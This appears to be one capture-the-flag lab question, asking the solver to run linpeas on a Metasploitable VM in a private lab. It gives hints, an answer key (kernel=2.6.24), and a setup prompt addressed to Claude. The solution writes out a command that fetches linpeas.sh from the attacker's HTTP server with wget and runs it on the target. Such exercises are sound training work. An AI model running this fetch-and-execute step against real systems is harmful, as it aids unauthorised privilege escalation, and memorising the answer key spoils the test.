# Q053 — linpeas Privilege Audit

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
| **Time budget** | 15–25 min |

---

## 📝 Question

After getting an msfadmin shell on Metasploitable, run linpeas.sh. Report the **kernel version** flagged.

---

## 🎯 Flag Format

```
kernel=<x.y.z>
```

Example: `kernel=2.6.24`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Transfer linpeas via wget from Parrot HTTP server.
</details>

<details>
<summary>Hint 2</summary>

Look for the `Kernel` section.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# On Parrot: python3 -m http.server 8000
# On target: wget http://192.168.52.128:8000/linpeas.sh && bash linpeas.sh
```

Kernel 2.6.24-16-server reported.

**Answer:** `kernel=2.6.24`

📖 Ref: [tools/linpeas.md](../../tools/linpeas.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q053".
```
